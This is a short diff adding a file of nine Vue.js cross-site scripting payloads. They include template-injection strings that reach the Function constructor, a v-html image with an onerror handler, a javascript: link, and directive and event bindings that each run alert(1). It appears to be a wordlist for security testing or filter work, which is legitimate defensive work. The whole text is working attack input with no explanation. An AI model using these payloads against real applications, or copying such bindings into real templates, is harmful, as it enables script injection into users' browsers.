@@ -1,0 +1,9 @@
+{{_openBlock.constructor('alert(1)')()}}
+<div v-html="'<img src=x onerror=alert(1)>'"></div>
+<div :class="alert(1)"></div>
+{{constructor.constructor('alert(1)')()}}
+<a :href="'javascript:alert(1)'">Click me</a>
+<template v-if="alert(1)"></template>
+<div v-bind:id="alert(1)"></div>
+<form @submit="alert(1)"></form>
+<input @focus="alert(1)" autofocus>
